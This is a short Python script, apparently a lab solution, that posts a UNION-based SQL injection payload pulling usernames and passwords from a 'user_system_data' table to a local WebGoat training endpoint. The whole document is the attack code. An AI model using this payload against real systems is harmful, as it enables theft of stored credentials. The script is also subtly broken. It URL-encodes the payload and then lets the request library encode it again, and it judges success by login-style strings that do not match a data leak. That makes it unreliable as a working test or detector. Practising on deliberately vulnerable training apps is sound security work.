import requests
from urllib.parse import quote_plus

# Define the target URL
target_url = "http://127.0.0.1:8080/WebGoat/SqlInjection/attack8"

# Define the SQL injection payload
payload = "' UNION SELECT null, username, password FROM user_system_data -- "
name = quote_plus(payload)  # URL-encode the payload
auth_tan = ""  # Empty for this scenario

# Prepare headers
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

# Send the HTTP POST request with the prepared payload
response = requests.post(target_url, data={'name': name, 'auth_tan': auth_tan}, headers=headers)

# Check the response for indicators of success
if "Welcome" in response.text or "Logged in successfully" in response.text:
    print("Vulnerability found!")
else:
    print("No vulnerability detected.")